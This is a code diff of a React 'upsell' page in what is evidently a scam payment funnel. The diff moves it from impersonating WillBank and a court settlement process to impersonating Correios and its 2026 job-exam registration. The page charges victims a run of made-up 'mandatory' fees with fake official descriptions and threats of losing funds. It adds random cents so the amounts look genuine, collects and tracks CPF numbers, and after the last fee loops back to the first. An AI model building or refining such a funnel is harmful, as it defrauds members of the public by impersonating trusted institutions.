@@ -1,138 +1,81 @@
 import { useEffect } from "react";
 import { useNavigate, useLocation, useParams } from "react-router-dom";
-import WillBankHeader from "@/components/WillBankHeader";
-import WillBankFooter from "@/components/WillBankFooter";
+import CorreiosHeader from "@/components/CorreiosHeader";
+import CorreiosFooter from "@/components/CorreiosFooter";
 import UpsellStep from "@/components/UpsellStep";
 import { CPFData } from "@/lib/cpf";
 import { getSession, saveSession } from "@/hooks/useSessionPersistence";
 import { buildUrlWithUtm } from "@/hooks/useUtmTracking";
 import { trackFunnelEvent } from "@/hooks/useFunnelTracking";
 
-// Define the 8 upsells with judicial context
 const UPSELLS = [
-  {
-    valor: 14.21,
-    title: "Taxa de Prioridade Judicial",
-    description: "Garante prioridade na fila de pagamentos do Tribunal, recebendo antes dos demais credores.",
-  },
-  {
-    valor: 32.98,
-    title: "Seguro de Execução Judicial",
-    description: "Seguro obrigatório exigido pelo BACEN para proteger transferências judiciais acima de R$ 3.000.",
-  },
-  {
-    valor: 21.30,
-    title: "Taxa de Homologação do BACEN",
-    description: "Homologação do Banco Central para validar a origem legal dos valores liberados pelo Tribunal.",
-  },
-  {
-    valor: 28.83,
-    title: "Certidão de Autenticidade Judicial",
-    description: "Documento judicial que certifica a legalidade e procedência da sua ordem de pagamento.",
-  },
-  {
-    valor: 13.23,
-    title: "Taxa de Urgência Processual",
-    description: "Acelera o processamento judicial para liberação em até 6 horas após pagamento.",
-  },
-  {
-    valor: 11.00,
-    title: "Seguro de Fraude Processual",
-    description: "Proteção contra tentativas de fraude no processo de liquidação judicial.",
-  },
-  {
-    valor: 8.83,
-    title: "Taxa de Encerramento do Processo",
-    description: "Taxa para encerramento formal do processo no sistema do Tribunal de Justiça.",
-  },
-  {
-    valor: 142.00,
-    title: "Taxa de Sentença Final do Tribunal",
-    description: "OBRIGATÓRIO: Última taxa judicial exigida para execução da sentença. Sem pagamento, o processo será arquivado e você PERDERÁ o direito aos valores.",
-  },
+  { valor: 78, title: "Material Completo de Estudos", description: "Apostila completa + simulados + videoaulas para o Concurso Correios 2026. Conteúdo atualizado conforme o edital." },
+  { valor: 29, title: "Taxa de Processamento Digital", description: "Taxa obrigatória para processamento digital da inscrição no sistema dos Correios." },
+  { valor: 34, title: "Seguro de Inscrição", description: "Seguro que garante reembolso integral caso o concurso seja cancelado ou adiado." },
+  { valor: 19, title: "Taxa de Confirmação de Vaga", description: "Confirmação e reserva da sua vaga para a data de prova selecionada." },
+  { valor: 42, title: "Kit Preparatório Express", description: "Kit com resumos, mapas mentais e questões comentadas para revisão de última hora." },
+  { valor: 15, title: "Taxa de Emissão de Comprovante", description: "Emissão do comprovante oficial de inscrição com código de autenticação." },
+  { valor: 22, title: "Certificado de Inscrição Digital", description: "Certificado digital de inscrição válido como documento oficial do concurso." },
+  { valor: 12, title: "Taxa de Finalização", description: "Taxa final para encerramento do processo de inscrição no sistema." },
+  { valor: 89, title: "Garantia de Vaga Prioritária", description: "IMPORTANTE: Garante prioridade na alocação da sua vaga na agência mais próxima." },
 ];
 
 const Upsell = () => {
   const navigate = useNavigate();
   const location = useLocation();
   const { step } = useParams<{ step: string }>();
-  
-  // Parse step number (1-7), default to 1. Handle NaN case.
+
   const parsedStep = parseInt(step || "1", 10);
-  const stepNumber = isNaN(parsedStep) ? 1 : Math.min(Math.max(parsedStep, 1), 8);
+  const stepNumber = isNaN(parsedStep) ? 1 : Math.min(Math.max(parsedStep, 1), 9);
   const currentIndex = stepNumber - 1;
   const currentUpsell = UPSELLS[currentIndex];
 
-  // Try to get data from location state or session
+  // Add random cents
+  const valorComCentavos = currentUpsell.valor + (Math.floor(Math.random() * 99) + 1) / 100;
+
   const session = getSession();
   const cpfData: CPFData | undefined = location.state?.cpfData || session?.cpfData;
   const valorBeneficio: number | undefined = location.state?.valorBeneficio || session?.valorBeneficio;
   const protocolo: string | undefined = location.state?.protocolo || session?.protocolo;
 
-  // Scroll to top on step change
-  useEffect(() => {
-    window.scrollTo(0, 0);
-  }, [stepNumber]);
+  useEffect(() => { window.scrollTo(0, 0); }, [stepNumber]);
 
-  // Redirect if no data
   useEffect(() => {
-    if (!cpfData || !valorBeneficio) {
-      navigate("/");
-      return;
-    }
-
-    // Save session with current upsell step
-    saveSession({ 
-      cpfData, 
-      currentStep: `/upsell/${stepNumber}`, 
-      valorBeneficio, 
-      protocolo 
-    });
-    
-    // Track funnel event
+    if (!cpfData) { navigate("/"); return; }
+    saveSession({ cpfData, currentStep: `/upsell/${stepNumber}`, valorBeneficio, protocolo });
     trackFunnelEvent(`upsell-${stepNumber}`, { cpf: cpfData.cpf });
   }, [cpfData, valorBeneficio, protocolo, navigate, stepNumber]);
 
   const handlePaymentConfirmed = () => {
-    const stateData = {
-      cpfData,
-      valorBeneficio,
-      protocolo,
-    };
-
-    if (stepNumber < 8) {
-      // Navigate to next upsell page
+    const stateData = { cpfData, valorBeneficio, protocolo };
+    if (stepNumber < 9) {
       navigate(buildUrlWithUtm(`/upsell/${stepNumber + 1}`), { state: stateData });
     } else {
-      // After upsell 8, go back to upsell 1
       navigate(buildUrlWithUtm("/upsell/1"), { state: stateData });
     }
   };
 
-  if (!cpfData || !valorBeneficio) return null;
+  if (!cpfData) return null;
 
   return (
-    <div className="min-h-screen min-h-[100dvh] bg-background flex flex-col">
-      <WillBankHeader 
-        userName={cpfData.nome.split(' ')[0].toUpperCase()} 
-        breadcrumb={`Liquidação Judicial > Taxas Obrigatórias > Etapa ${stepNumber}/8`}
-      />
+    <div className="min-h-screen flex flex-col bg-background">
+      <CorreiosHeader breadcrumb={`Concursos > Inscrição > Etapa ${stepNumber}/9`} />
 
-      <main className="flex-1 flex items-center justify-center p-3 sm:p-6">
+      <main className="flex-1 flex items-center justify-center px-4 py-6 sm:py-8">
         <UpsellStep
           key={stepNumber}
           title={currentUpsell.title}
           description={currentUpsell.description}
-          valor={currentUpsell.valor}
+          valor={valorComCentavos}
           cpfData={cpfData}
-          protocolo={protocolo || `WB${Date.now()}`}
+          protocolo={protocolo || `COR${Date.now()}`}
           onPaymentConfirmed={handlePaymentConfirmed}
           stepNumber={stepNumber}
-          totalSteps={8}
+          totalSteps={9}
         />
       </main>
 
-      <WillBankFooter />
+      <CorreiosFooter />
     </div>
   );
 };
